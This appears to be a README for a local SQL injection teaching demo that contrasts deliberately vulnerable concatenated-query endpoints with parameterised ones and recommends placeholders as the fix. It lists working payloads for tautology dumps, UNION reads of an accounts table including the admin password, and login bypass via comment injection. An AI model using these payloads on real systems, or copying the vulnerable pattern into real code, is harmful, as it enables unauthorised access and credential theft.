## SQL Injection Demo

Server runs on port **6080**. Start it with:

```bash
cd spring-postgres
docker-compose up -d   # PostgreSQL on 5442
./gradlew bootRun
```

---

### Endpoints

| Endpoint | Behaviour |
|---|---|
| `GET /sqli/vulnerable/search?name=` | Concatenates input directly into SQL |
| `GET /sqli/safe/search?name=`       | Parameterised query — injection-proof |
| `GET /sqli/vulnerable/login?username=&password=` | String-concat WHERE clause |
| `GET /sqli/safe/login?username=&password=`       | Parameterised — injection-proof |

Demo accounts in `sqli_accounts`: admin / alice / bob.

---

### Attack Payloads

#### 1. Normal lookup (baseline)

```
GET /sqli/vulnerable/search?name=Alice
```

Returns Alice's row — works as intended.

---

#### 2. Tautology — dump all rows

```
GET /sqli/vulnerable/search?name=' OR '1'='1
```

SQL becomes:
```sql
SELECT id, name, email, status FROM users WHERE name = '' OR '1'='1'
```
`'1'='1'` is always true → returns **every row** in the table.

Safe version blocks it:
```
GET /sqli/safe/search?name=' OR '1'='1
```
Returns 0 rows — the whole string is treated as a literal name.

---

#### 3. Comment injection — strip the rest of the query

```
GET /sqli/vulnerable/search?name=Alice'--
```

SQL becomes:
```sql
SELECT id, name, email, status FROM users WHERE name = 'Alice'--'
```
`--` comments out everything after it. Useful for bypassing extra conditions.

---

#### 4. UNION attack — read another table

```
GET /sqli/vulnerable/search?name=' UNION SELECT id, username, password, role FROM sqli_accounts--
```

SQL becomes:
```sql
SELECT id, name, email, status FROM users
WHERE name = ''
UNION
SELECT id, username, password, role FROM sqli_accounts--'
```

Returns all **sqli_accounts** rows (including the admin password) piggybacked on the users query.

> Column count and types must match — here both SELECT lists have 4 columns.

---

#### 5. Auth bypass — login without knowing the password

```
GET /sqli/vulnerable/login?username=admin'--&password=anything
```

SQL becomes:
```sql
SELECT id, username, role FROM sqli_accounts
WHERE username = 'admin'--' AND password = 'anything'
```

`--` comments out the `AND password = ...` check → authenticated as admin with any password.

---

#### 6. Tautology login — bypass as the first account

```
GET /sqli/vulnerable/login?username=' OR '1'='1'--&password=x
```

SQL becomes:
```sql
SELECT id, username, role FROM sqli_accounts
WHERE username = '' OR '1'='1'--' AND password = 'x'
```

Returns every account; the code takes `rows.get(0)` → logged in as admin.

---

#### 7. Safe endpoints — all payloads above return 0 rows or "Invalid credentials"

```
GET /sqli/safe/login?username=admin'--&password=anything
# → {"authenticated":false,"message":"Invalid credentials"}

GET /sqli/safe/search?name=' OR '1'='1
# → []
```

The `?` placeholder passes the raw string to the DB as a bind value — it can never alter the query structure.

---

### Why String Concatenation Is Dangerous

| Attack type | What it does |
|---|---|
| Tautology (`OR 1=1`) | Makes WHERE always true — dumps the table |
| Comment (`--`) | Cuts off the rest of the query |
| UNION | Appends a second SELECT to read any other table |
| Auth bypass | Removes the password check entirely |

**Fix:** always use `?` placeholders (or named parameters). Never build SQL by concatenating user input.